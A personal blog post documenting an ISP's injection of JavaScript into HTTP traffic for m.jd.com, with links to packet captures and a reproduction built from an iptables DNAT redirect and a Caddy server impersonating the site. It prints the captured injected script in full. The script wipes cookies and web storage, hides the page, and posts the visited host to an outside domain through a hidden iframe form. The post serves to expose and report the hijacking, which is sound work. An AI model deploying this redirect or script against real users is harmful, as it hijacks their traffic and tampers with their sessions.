---
title: Simple HTTP Hijacking
date: 2018-06-08T11:01:11
description: "运营商劫持了 HTTP 连接的内容，严重影响了网络的正常使用。"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Preface

As a man heavily relies on network stablity, I connected to Internet via CT Network.

However, after experiencing the DNS response packet fully-filled with alphabet within two days, I experienced a HTTP JavaScript Hijacking again. This time, they hijacked ```m.jd.com:80``` . I reproduced this "feature" using my Arch Linux PC Chrome, iPad Safari, iPad Chrome again and again.

I will provide my packet capture files here.

DNS Capture:  [PCAP File](/asset_files/udp53_filledNONSENSE.pcap)

Hijack Capture: [CHLS File - Charles Proxy](/asset_files/jd_hijack_ipad.chls)

They still don't admit it. And they asked me if they could go to my house and check it themselves. I accepted. However, the process of reproduction is tested under a very clear environment. Now, they set up a whitelist and want to cheat me.

I won't accept any cheat. Now, I started to deploy a hijack by myself now.


# Deployment

## Add NAT to redirect traffic

>`REDIRECT` alters the destination IP address to send to the machine itself. In other words, locally generated packets are mapped to the 127.0.0.1 address. It's for redirecting local packets. If you only want to redirect the traffic between services on the local machine, it will be a good choice.

> `DNAT` is actual [Network Address Translation](http://en.wikipedia.org/wiki/Network_address_translation). If you want packets destinated outside of the local system to have the destination altered, it's the better choice of the two, as `REDIRECT` will not work.


iptables Config

```bash
# sysctl -w net.ipv4.ip_forward=1
# iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
# iptables -t nat -A PREROUTING -p tcp -m tcp -s <SOURCE IP> -d <DESTINATION IP> -j DNAT --to-destination <WEB SERVER IP>:<PORT>
```

## Caddy for listening on port 80

Caddy Config

```
http://m.jd.com:80 {
   timeouts none
   log stdout
   root /tmp/testweb
}
```

/tmp/testweb/index.html (File dumped from pcap file)

```html
<!DOCTYPE html><html><head><title></title></head><body><script type="text/javascript">function qs(n,m,v,u){u=u||D.URL;var t=u.match(eval('/(\\?|#|&)('+n+')=([^&]*)(&|$)/i'));if(t){m=m||t[2];v=t[3]||v}return m&&v?'&'+m+'='+v:''}function fc(){var h=location.host,x='=;expires='+new Date(0).toUTCString(),y=x+';path=',z=y+'/;domain=',l=[x,y,y+'/',z+h,z+h.substr(h.indexOf('.'))],o=D.cookie.match(/[^ =;]+(?=\=)/g);if(o&&S)for(var i=o.length;i--;)for(var j=5;j--;)D.cookie=o[i]+l[j];if(window.localStorage)localStorage.clear();if(window.sessionStorage)sessionStorage.clear();setTimeout(fc,500)}function fip(){var u=('http://m.quanwangfa.com/').replace(/(\?|#)&/g,'$1');D.body.appendChild(D.createElement('iframe')).src="javascript:var D=document;D.write(\"<html><body><form method='post'action='"+u+"'><input name='t'value='"+location.host+"'/><input name='p'value='0'/><input name='g'value='_top'/><input type='submit'id='s'/></form></body></html>\");var s=D.getElementById('s');if (s.click) s.click();D.close()";setTimeout(function(){if(S){D.cookie='home=s';location.reload()}},3000)}var D=document,d=D,S=!D.cookie.match(/home=s/i);D.body.style.visibility='hidden';D.oncontextmenu=function(){return false};fc();fip()</script></body></html>
```

# Done!

Tested. 

Update: 2 weeks after I report to MIIT, still can be reproduced on my HUAWEI device.

# Referrence

https://serverfault.com/questions/179200/difference-beetween-dnat-and-redirect-in-iptables
http://xstarcd.github.io/wiki/Linux/iptables_forward_internetshare.html
https://my.oschina.net/tridays/blog/785483
